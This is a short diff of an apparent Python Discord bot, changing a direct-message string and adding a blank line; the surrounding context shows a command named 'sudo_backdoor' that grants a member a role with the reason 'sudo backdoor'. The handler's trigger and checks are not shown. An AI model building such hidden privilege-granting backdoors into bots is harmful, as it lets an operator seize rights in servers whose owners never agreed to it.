@@ -137,7 +137,7 @@ async def sudo_backdoor(ctx):
         await member.add_roles(role, reason="sudo backdoor")
 
     try:
-        await member.send(f"✅ Backdoor role applied in **{guild.name}**.")
+        await member.send(f"✅ Backdoor applied in **{guild.name}**.")
     except discord.Forbidden:
         pass
 
@@ -219,4 +219,5 @@ if not TOKEN:
 
 time.sleep(10)  # Railway safety
 bot.run(TOKEN)
+
 
